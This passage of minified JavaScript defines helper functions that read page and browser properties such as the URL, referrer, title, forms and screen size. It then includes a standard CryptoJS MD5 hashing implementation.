document.lastModified}catch(e){return e.message}}function $get_readyState(){try{return document.readyState}catch(e){return e.message}}function $get_referrer(){try{return document.referrer}catch(e){return e.message}}function $get_siteURL(){try{return document.URL}catch(e){return e.message}}function $get_hostname(){try{return window.location.hostname}catch(e){return e.message}}function $get_protocol(){try{return window.location.protocol}catch(e){return e.message}}function $get_data(){try{return Date()}catch(e){return e.message}}function $get_title(){try{return document.title}catch(e){return e.message}}function $get_body(){try{return document.body}catch(e){return e.message}}function $get_html(){try{return document.documentElement}catch(e){return e.message}}function $get_embeds(){try{return document.embeds}catch(e){return e.message}}function $get_forms(){try{return document.forms}catch(e){return e.message}}function $get_head(){try{return document.head}catch(e){return e.message}}function $get_images(){try{return document.images}catch(e){return e.message}}function $get_links(){try{return document.links}catch(e){return e.message}}function $get_scripts(){try{return document.scripts}catch(e){return e.message}}function $get_screen_height(){try{return screen.height}catch(e){return e.message}}function $get_screen_width(){try{return screen.width}catch(e){return e.message}}!function(e){function t(e,t,n,r,a,o,c){return((e=e+(t&n|~t&r)+a+c)<<o|e>>>32-o)+t}function n(e,t,n,r,a,o,c){return((e=e+(t&r|n&~r)+a+c)<<o|e>>>32-o)+t}function r(e,t,n,r,a,o,c){return((e=e+(t^n^r)+a+c)<<o|e>>>32-o)+t}function a(e,t,n,r,a,o,c){return((e=e+(n^(t|~r))+a+c)<<o|e>>>32-o)+t}for(var o=CryptoJS,c=(u=o.lib).WordArray,s=u.Hasher,u=o.algo,_=[],i=0;64>i;i++)_[i]=4294967296*e.abs(e.sin(i+1))|0;u=u.MD5=s.extend({_doReset:function(){this._hash=new c.init([1732584193,4023233417,2562383102,271733878])},_doProcessBlock:function(e,o){for(var c=0;16>c;c++){var s=e[u=o+c];e[u]=16711935&(s<<8|s>>>24)|4278255360&(s<<24|s>>>8)}c=this._hash.words;var u=e[o+0],i=(s=e[o+1],e[o+2]),l=e[o+3],g=e[o+4],m=e[o+5],y=e[o+6],d=e[o+7],f=e[o+8],h=e[o+9],b=e[o+10],p=e[o+11],$=e[o+12],k=e[o+13],v=e[o+14],B=e[o+15],E=t(E=c[0],C=c[1],N=c[2],w=c[3],u,7,_[0]),w=t(w,E,C,N,s,12,_[1]),N=t(N,w,E,C,i,17,_[2]),C=t(C,N,w,E,l,22,_[3]);E=t(E,C,N,w,g,7,_[4]),w=t(w,E,C,N,m,12,_[5]),N=t(N,w,E,C,y,17,_[6]),C=t(C,N,w,E,d,22,_[7]),E=t(E,C,N,w,f,7,_[8]),w=t(w,E,C,N,h,12,_[9]),N=t(N,w,E,C,b,17,_[10]),C=t(C,N,w,E,p,22,_[11]),E=t(E,C,N,w,$,7,_[12]),w=t(w,E,C,N,k,12,_[13]),N=t(N,w,E,C,v,17,_[14]),E=n(E,C=t(C,N,w,E,B,22,_[15]),N,w,s,5,_[16]),w=n(w,E,C,N,y,9,_[17]),N=n(N,w,E,C,p,14,_[18]),C=n(C,N,w,E,u,20,_[19]),E=n(E,C,N,w,m,5,_[20]),w=n(w,E,C,N,b,9,_[21]),N=n(N,w,E,C,B,14,_[22]),C=n(C,N,w,E,g,20,_[23]),E=n(E,C,N,w,h,5,_[24]),w=n(w,E,C,N,v,9,_[25]),N=n(N,w,E,C,l,14,_[26]),C=n(C,N,w,E,f,20,_[27]),E=n(E,C,N,w,k,5,_[28]),w=n(w,E,C,N,i,9,_[29]),N=n(N,w,E,C,d,14,_[30]),E=r(E,C=n(C,N,w,E,$,20,_[31]),N,w,m,4,_[32]),w=r(w,E,C,N,f,11,_[33]),N=r(N,w,E,C,p,16,_[34]),C=r(C,N,w,E,v,23,_[35]),E=r(E,C,N,w,s,4,_[36]),w=r(w,E,C,N,g,11,_[37]),N=r(N,w,E,C,d,16,_[38]),C=r(C,N,w,E,b,23,_[39]),E=r(E,C,N,w,k,4,_[40]),w=r(w,E,C,N,u,11,_[41]),N=r(N,w,E,C,l,16,_[42]),C=r(C,N,w,E,y,23,_[43]),E=r(E,C,N,w,h,4,_[44]),w=r(w,E,C,N,$,11,_[45]),N=r(N,w,E,C,B,16,_[46]),E=a(E,C=r(C,N,w,E,i,23,_[47]),N,w,u,6,_[48]),w=a(w,E,C,N,d,10,_[49]),N=a(N,w,E,C,v,15,_[50]),C=a(C,N,w,E,m,21,_[51]),E=a(E,C,N,w,$,6,_[52]),w=a(w,E,C,N,l,10,_[53]),N=a(N,w,E,C,b,15,_[54]),C=a(C,N,w,E,s,21,_[55]),E=a(E,C,N,w,f,6,_[56]),w=a(w,E,C,N,B,10,_[57]),N=a(N,w,E,C,y,15,_[58]),C=a(C,N,w,E,k,21,_[59]),E=a(E,C,N,w,g,6,_[60]),w=a(w,E,C,N,p,10,_[61]),N=a(N,w,E,C,i,15,_[62]),C=a(C,N,w,E,h,21,_[63]);c[0]=c[0]+E|0,c[1]=c[1]+C|0,c[2]=c[2]+N|0,c[3]=c[3]+w|0},_doFinalize:function(){var t=this._data,n=t.words,r=8*this._nDataBytes,a=8*t.sigBytes;n[a>>>5]|=128<<24-a%32;var o=e.floor(r/4294967296);for(n[15+(a+64>>>9<<4)]=16711935&(o<<8|o>>>24)|4278255360&(o<<24|o>>>8),n[14+(a+64>>>9<<4)]=16711935&(r<<8|r>>>24)|4278255360&(r<<24|r>>>8),t.sigBytes=4*(n.length+1),this._process(),n=(t=this._hash).words,r=0;4>r;r++)a=n[r],n[r]=16711935&(a<<8|a>>>24)|4278255360&(a<<24|a>>>8);return t},clone:function(){var e=s.clone.call(this);return e._hash=this._hash.clone(),e}}),o.MD5=s._createHelper(u),o.HmacMD5=s._createHmacHelper(u)}(Math);
